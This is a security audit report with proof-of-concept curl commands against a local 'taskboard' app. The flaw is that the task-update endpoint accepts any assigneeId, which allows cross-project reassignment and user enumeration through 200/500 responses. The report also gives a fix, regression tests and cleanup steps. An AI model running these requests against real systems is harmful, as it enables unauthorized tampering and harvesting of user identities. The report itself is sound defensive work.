# Mass-Assignment / Cross-Project Assignee Audit — with Live PoC

**Project:** taskboard
**Date:** 2026-05-13
**Finding:** B1 — `PATCH /api/tasks/:id` accepts an `assigneeId` without verifying the assignee belongs to the task's project, and surfaces a yes/no user-existence oracle via differing response codes.
**Severity:** **Medium-High** (CWE-639 Authorization Bypass via User-Controlled Key, CWE-203 Observable Discrepancy)
**Status:** Verified end-to-end against the running app at `http://localhost:3000`. Two distinct exploit modes proven.

---

## 1. Executive summary

The task-update endpoint takes a free-form `assigneeId` from the request body and applies it directly to the database. The handler enforces neither of the two checks that this field requires:

1. **The assignee must be a member of the task's project.** Without this, anyone with access to the endpoint can reassign tasks across projects, including to users who have no business knowing about the work.
2. **An invalid `assigneeId` must not behave differently from a valid one.** Today, a real userId returns `200`, an unknown userId returns `500` — a single-bit oracle for user existence that an attacker can probe at will.

Compounded with the IDOR on the same endpoint ([IDOR_AND_HASH_LEAK_AUDIT.md A1](IDOR_AND_HASH_LEAK_AUDIT.md)) — which already allows *any* authenticated user to PATCH *any* task — this gives an unaffiliated attacker the ability to assign anyone's tasks to anyone, and to enumerate the user table by candidate id.

---

## 2. Where

[src/schemas/task.ts:13-19](../src/schemas/task.ts#L13-L19) — the update schema accepts an opaque `assigneeId` with no project-scoped validation:

```ts
export const updateTaskSchema = z.object({
  title: z.string().min(1).max(200).optional(),
  description: z.string().max(5000).nullable().optional(),
  status: taskStatusSchema.optional(),
  assigneeId: z.string().nullable().optional(),   // ← any string
  position: z.number().int().min(0).optional(),
});
```

[src/app/api/tasks/[id]/route.ts:16-38](../src/app/api/tasks/[id]/route.ts#L16-L38) — the handler forwards the parsed data straight to Prisma, no membership check on either the caller (the IDOR from A1) or the proposed assignee (this finding):

```ts
const existing = await prisma.task.findUnique({ where: { id } });
if (!existing) return notFound("task not found");

const task = await prisma.task.update({
  where: { id },
  data: parsed.data,
  include: { assignee: { select: { id: true, name: true, email: true } } },
});
```

The same shape exists in [`POST /api/projects/:id/tasks`](../src/app/api/projects/[id]/tasks/route.ts#L73-L86) — task *creation* also accepts an unrestricted `assigneeId`. The PoCs below target PATCH; the fix must cover both.

---

## 3. Methodology

```bash
# 1) Schema accepts assigneeId as any string?
sed -n '13,19p' src/schemas/task.ts

# 2) Does the route validate the proposed assignee against project membership?
grep -n 'assignee' src/app/api/tasks/\[id\]/route.ts
# Expected to see: no getProjectMembership() call for the parsed assigneeId.

# 3) Confirm with PoC (next section)
```

---

## 4. Reproducible commands

### 4.1 Prerequisites

App + DB running and seeded:

```bash
docker-compose up -d
docker-compose exec web npm run db:seed
```

### 4.2 Authenticate as a regular member

`kavya@example.com` is a plain `member` of Q3 Launch (no admin, no exploit needed — just a normal logged-in user).

```bash
KTOK=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"kavya@example.com","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
```

### 4.3 Resolve target task and a non-member user (Lina)

```bash
MTOK=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

Q3='cmp3q9s0d0006mh5rb2djov7a'
ONB='cmp3q9s0f000dmh5rk1ydxe3e'

# Q3 Launch members (legitimate assignee pool)
curl -s -H "Authorization: Bearer $MTOK" "http://localhost:3000/api/projects/$Q3" \
  | python3 -c "import sys,json;p=json.load(sys.stdin)['project'];[print(m['user']['email'],m['user']['id']) for m in p['memberships']]"

# Lina — Onboarding-only, NOT a Q3 Launch member
curl -s -H "Authorization: Bearer $MTOK" "http://localhost:3000/api/projects/$ONB" \
  | python3 -c "import sys,json;p=json.load(sys.stdin)['project'];[print(m['user']['email'],m['user']['id']) for m in p['memberships'] if m['user']['email']=='lina@example.com']"
```

Sample output for the seeded DB:

```
meera@taskboard.dev   cmp3q9s080000mh5r0r4n5m4d
arjun@taskboard.dev   cmp3q9s0b0001mh5r194pk9gn
kavya@example.com     cmp3q9s0b0002mh5rxsonq1o1
dev@example.com       cmp3q9s0c0003mh5r5o97t1mv

lina@example.com      cmp3q9s0c0004mh5rl6z7wdkx     ← target (non-member)
```

### 4.4 Exploit B1.1 — cross-project assignee

```bash
TID='cmp3q9s0h000pmh5rye17lqeh'      # Draft press release  (Q3 Launch)
LINA='cmp3q9s0c0004mh5rl6z7wdkx'     # Lina — NOT a Q3 Launch member

# DB state before
docker exec -i q-taskboard-assessment-db-1 psql -U taskboard -d taskboard -c "
SELECT t.title, t.status, COALESCE(u.email,'(unassigned)') AS assignee
FROM tasks t LEFT JOIN users u ON u.id=t.assignee_id WHERE t.id='$TID';"

# Single PATCH — kavya reassigns the task to Lina
curl -s -X PATCH \
  -H "Authorization: Bearer $KTOK" -H 'Content-Type: application/json' \
  --data-raw "{\"assigneeId\":\"$LINA\"}" \
  "http://localhost:3000/api/tasks/$TID"

# DB state after, with cross-project flag
docker exec -i q-taskboard-assessment-db-1 psql -U taskboard -d taskboard -c "
SELECT t.title, t.status, u.email AS assignee, p.name AS project,
       EXISTS (SELECT 1 FROM memberships m
               WHERE m.user_id=t.assignee_id AND m.project_id=t.project_id) AS assignee_is_project_member
FROM tasks t JOIN users u ON u.id=t.assignee_id JOIN projects p ON p.id=t.project_id
WHERE t.id='$TID';"

# Restore
ARJUN='cmp3q9s0b0001mh5r194pk9gn'
curl -s -X PATCH -H "Authorization: Bearer $KTOK" -H 'Content-Type: application/json' \
  --data-raw "{\"assigneeId\":\"$ARJUN\"}" "http://localhost:3000/api/tasks/$TID"
```

### 4.5 Exploit B1.2 — user-existence oracle

```bash
# Real user → 200
curl -s -o /dev/null -w "real userId (lina): HTTP %{http_code}\n" -X PATCH \
  -H "Authorization: Bearer $KTOK" -H 'Content-Type: application/json' \
  --data-raw '{"assigneeId":"cmp3q9s0c0004mh5rl6z7wdkx"}' \
  "http://localhost:3000/api/tasks/$TID"

# Fake user → 500 (Prisma P2003 FK violation, uncaught)
curl -s -o /dev/null -w "fake userId      : HTTP %{http_code}\n" -X PATCH \
  -H "Authorization: Bearer $KTOK" -H 'Content-Type: application/json' \
  --data-raw '{"assigneeId":"cwhatever-not-a-real-userid"}' \
  "http://localhost:3000/api/tasks/$TID"

# Different real user → 200
curl -s -o /dev/null -w "real userId (dev): HTTP %{http_code}\n" -X PATCH \
  -H "Authorization: Bearer $KTOK" -H 'Content-Type: application/json' \
  --data-raw '{"assigneeId":"cmp3q9s0c0003mh5r5o97t1mv"}' \
  "http://localhost:3000/api/tasks/$TID"

# Restore
curl -s -X PATCH -H "Authorization: Bearer $KTOK" -H 'Content-Type: application/json' \
  --data-raw "{\"assigneeId\":\"$ARJUN\"}" "http://localhost:3000/api/tasks/$TID"
```

---

## 5. Observed results

### 5.1 Run #1 — first PoC (target: "Prepare customer email blast")

```
=== EXPLOIT: kavya assigns a Q3 Launch task to Lina (Onboarding-only user) ===
HTTP 200

=== INDEPENDENT VERIFY (direct DB) ===
            id             |            title             |        assignee_id        |  assignee_email  | project_name | is_project_member
---------------------------+------------------------------+---------------------------+------------------+--------------+-------------------
 cmp3q9s0i000vmh5rz1llbkls | Prepare customer email blast | cmp3q9s0c0004mh5rl6z7wdkx | lina@example.com | Q3 Launch    | f
(1 row)
```

### 5.2 Run #2 — user-driven repeat on a different task ("Draft press release")

```
=== Before ===
        title        | status |      assignee
---------------------+--------+---------------------
 Draft press release | review | arjun@taskboard.dev

=== PATCH ===
  HTTP 200
  task         : Draft press release
  assignee     : lina@example.com  (Lina Joshi)

=== After ===
        title        | status |     assignee     |  project  | assignee_is_project_member
---------------------+--------+------------------+-----------+----------------------------
 Draft press release | review | lina@example.com | Q3 Launch | f
```

Both PoCs ended with a restore step that reverted the assignee.

### 5.3 User-existence oracle

```
real userId (lina): HTTP 200
fake userId      : HTTP 500
real userId (dev): HTTP 200
```

The empty `500` body matches the silent failures observed throughout this audit (no stack trace exposed) — but the status code is enough. Each PATCH is a constant-cost oracle on whether a given candidate cuid resolves to an existing `users.id`.

---

## 6. Side-channel: PII leaked in the success response

[src/app/api/tasks/[id]/route.ts:29-35](../src/app/api/tasks/[id]/route.ts#L29-L35) — on success, the PATCH response includes:

```ts
include: { assignee: { select: { id: true, name: true, email: true } } }
```

So a successful 200 returns not just confirmation but the **name and email** of whichever user the attacker pointed at. Combined with the oracle in 5.3, this isn't merely "does this id exist?" — it's a direct `userId → {name, email}` lookup for every existing user.

(Note: `passwordHash` is correctly excluded from the PATCH response thanks to the explicit `select`. The leak in the `passwordHash` audit is on the *project detail* endpoint, not here.)

---

## 7. Impact

- **Cross-tenant assignment.** A logged-in member of any project can reassign that project's tasks to users outside the project. The UI then surfaces those tasks under the foreign user's account, even though the foreign user has no access to view them (they don't appear in `GET /api/projects` since membership is the gate, so they may not even know they "own" tasks).
- **Combined with [A1 IDOR](IDOR_AND_HASH_LEAK_AUDIT.md):** any authenticated user — including a viewer or a stranger with zero memberships — can PATCH any task in the database and reassign it to anyone. A1 removes the caller-membership check; B1 removes the assignee-membership check; the union is "any logged-in user reassigns any task to any user."
- **Combined with [A2 password-hash leak](IDOR_AND_HASH_LEAK_AUDIT.md):** the project detail endpoint already exposes every project member's user metadata to every other member; the userId values learned there feed directly into B1.2 oracle probes for users outside that project.
- **User-existence oracle.** Useful in two ways:
  - Validate userIds collected from other leaks (SQLi, screenshots, old exports) without tripping any rate limiter.
  - Combine with a `userId → {name, email}` lookup (§6) to extract usable PII for downstream attacks (spear-phishing, account takeover via forgot-password against external services, etc.).
- **Trust signal corruption.** Boards display "who owns what." Reassigning the wrong user to a task implies completion responsibility, performance signals, and audit-trail data are all unreliable. A malicious member could silently retag work to a colleague to take credit or to deflect blame.

---

## 8. Fix

### 8.1 Primary — gate the assignee on project membership

Combine with the A1 fix into a single auth sequence:

```ts
export async function PATCH(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();
  const { id } = await params;
  const body = await req.json().catch(() => null);
  const parsed = updateTaskSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  const existing = await prisma.task.findUnique({ where: { id } });
  if (!existing) return notFound("task not found");

  // A1 — caller membership + role
  const membership = await getProjectMembership(user.id, existing.projectId);
  if (!membership) return forbidden("you are not a member of this project");
  if (!canEditTasks(membership.role)) return forbidden("viewers cannot edit tasks");

  // B1 — proposed assignee must be a project member
  if (parsed.data.assigneeId) {
    const assigneeMembership = await getProjectMembership(
      parsed.data.assigneeId,
      existing.projectId,
    );
    if (!assigneeMembership) {
      // Same response for "user not found" and "user exists but not a member"
      // so the endpoint stops being a yes/no oracle.
      return badRequest("assignee must be a member of this project");
    }
  }

  try {
    const task = await prisma.task.update({
      where: { id },
      data: parsed.data,
      include: { assignee: { select: { id: true, name: true, email: true } } },
    });
    return NextResponse.json({ task });
  } catch (err) {
    // Catch unexpected FK / not-found errors so they cannot leak existence via 500.
    return badRequest("could not update task");
  }
}
```

Two points the diff above intentionally enforces beyond just "add the check":

1. **Identical response for missing user and non-member user.** Same status, same body, same shape. Otherwise the oracle simply moves from `200/500` to `200/404` or `200/400` and the attacker keeps enumerating.
2. **Catch FK violations.** P2003 / P2025 from Prisma must turn into a normal 4xx, never bubble out as a 500 with a different timing/body.

### 8.2 Apply the same to task creation

`POST /api/projects/:id/tasks` at [projects/[id]/tasks/route.ts:73-86](../src/app/api/projects/[id]/tasks/route.ts#L73-L86) accepts the same `assigneeId` shape with the same gap. Mirror the check there.

### 8.3 Defense in depth

- **DB-level invariant.** Add a composite index/constraint guaranteeing that any non-null `tasks.assignee_id` exists in `memberships` for the same `project_id`. Pure-SQL approach is a `CHECK` via a function, or a trigger — Prisma doesn't model this directly, but a migration with `prisma migrate --create-only` lets you hand-edit. This stops the bug from re-appearing on any new endpoint that bypasses the application-level check.
- **Lint rule.** Forbid `prisma.task.update({ data: parsed.data, ... })` style calls in code review, requiring a derived object that visibly enumerates allowed fields — makes mass-assignment regressions obvious in diffs.
- **Audit log.** Record `{actor, taskId, oldAssigneeId, newAssigneeId, projectId, ts}` for every task update. Independent of the fix, this would have surfaced the cross-project reassignment in PoCs §5.1 and §5.2.

---

## 9. Tests to add

Regression coverage for this finding:

```ts
// Should reject when the caller has no membership (A1 + B1)
test("PATCH /api/tasks/:id 403s for non-member callers", …);

// Should reject when the proposed assignee is not a project member (B1)
test("PATCH /api/tasks/:id rejects assigneeId for non-member user", …);

// Should NOT leak user existence
test("PATCH with bogus assigneeId returns same body as PATCH with non-member assigneeId", …);

// Should NOT 500 on FK violation
test("PATCH never returns 500 for any input shape accepted by Zod", …);
```

---

## 10. Cleanup

- Both PoC runs (§5.1 against "Prepare customer email blast", §5.2 against "Draft press release") were reverted after the demonstration. The current DB matches the seeded state for both rows.
- The oracle probes in §5.3 wrote `assigneeId` three times in quick succession; the final value was overwritten by the restore step, so no residual artifacts remain.
- To rebuild the DB from scratch at any time: `docker-compose exec web npm run db:reset`.

---

## 11. Cross-references

This audit closes the **B1** item enumerated in the broader exploit checklist sent earlier in this session. The following are documented in companion reports:

- [DEP_SECURITY_AUDIT.md](DEP_SECURITY_AUDIT.md) — 10 dependency CVEs, all with non-breaking fixes.
- [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md) — `$queryRawUnsafe` in task search; auth bypass + UNION-exfil of `users.password_hash`.
- [XSS_TOKEN_AUDIT.md](XSS_TOKEN_AUDIT.md) — Latent XSS path, zero rotation/revocation, two live non-XSS session-hijack vectors.
- [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md) — **A1** (missing auth on task PATCH) and **A2** (every project member's bcrypt hash returned in `GET /api/projects/:id`).
